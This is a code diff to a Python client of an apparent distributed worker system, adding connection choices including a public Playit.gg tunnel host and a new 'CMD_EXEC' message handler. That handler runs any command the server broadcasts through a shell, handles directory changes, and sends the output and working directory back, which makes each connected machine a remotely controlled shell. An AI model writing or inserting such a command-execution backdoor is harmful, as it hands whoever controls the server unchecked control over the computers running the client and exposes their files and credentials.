@@ -5,6 +5,7 @@ import cpuinfo
 import json
 import base64
 import os
+import subprocess
 from pathlib import Path
 from Function_Net.recieving import receive_and_decompress_file
 import hashlib
@@ -283,9 +284,24 @@ if __name__ == "__main__":
     print("              CLIENT - Connecting to Server")
     print("═" * 80)
     
-    #server = input("\nEnter server IP (default: 192.168.100.250): ") or "192.168.100.250"
-    #port_input = input("Enter server port (default: 5050): ") or "5050"
-    port = 5050
+    print("\nSelect Connection Mode:")
+    print("1. Local Network (192.168.100.66:5555)")
+    print("2. Public Playit.gg (because-institution.gl.at.ply.gg:2270)")
+    print("3. Custom IP/Port")
+    
+    choice = input("\nEnter choice (1-3) [1]: ").strip()
+    
+    if choice == "2":
+        server = "because-institution.gl.at.ply.gg"
+        port = 2270
+    elif choice == "3":
+        server = input("Enter server IP: ").strip()
+        port_str = input("Enter server port: ").strip()
+        port = int(port_str) if port_str.isdigit() else 5555
+    else:
+        server = "192.168.100.66"
+        port = 5555
+
     name =  socket.gethostname()
     
     print(f"\n[*] Connecting to server {server}:{port} as '{name}'...")
@@ -370,6 +386,54 @@ if __name__ == "__main__":
                             
                             print(f"{GREEN}[*] Worker with ID: {worker_id} has completed its task.{RESET}")
                             continue
+                        
+                        elif broadcast_msg.get("type") == "CMD_EXEC":
+                            command = broadcast_msg.get("command")
+                            print(f"{BLUE}[*] Received command: {command}{RESET}")
+                            
+                            try:
+                                # Execute command
+                                if command.lower().startswith("cd "):
+                                    # Handle directory change
+                                    try:
+                                        target_dir = command[3:].strip()
+                                        os.chdir(target_dir)
+                                        output = f"Changed directory to {os.getcwd()}"
+                                    except Exception as e:
+                                        output = str(e)
+                                else:
+                                    # Execute shell command
+                                    process = subprocess.Popen(
+                                        command, 
+                                        shell=True, 
+                                        stdout=subprocess.PIPE, 
+                                        stderr=subprocess.PIPE,
+                                        stdin=subprocess.PIPE
+                                    )
+                                    stdout, stderr = process.communicate()
+                                    output = stdout.decode('utf-8', errors='replace') + stderr.decode('utf-8', errors='replace')
+                                
+                                if not output:
+                                    output = "[Command executed successfully with no output]"
+                                    
+                            except Exception as e:
+                                output = f"Error executing command: {str(e)}"
+                            
+                            # Send output back
+                            response = json.dumps({
+                                "type": "CMD_OUTPUT", 
+                                "output": output,
+                                "cwd": os.getcwd()
+                            })
+                            
+                            response_bytes = response.encode(FORMAT)
+                            response_length = len(response_bytes)
+                            send_length = str(response_length).encode(FORMAT)
+                            send_length += b' ' * (HEADER - len(send_length))
+                            client.send(send_length)
+                            client.send(response_bytes)
+                            continue
+                            
                     except json.JSONDecodeError:
                         pass
                     
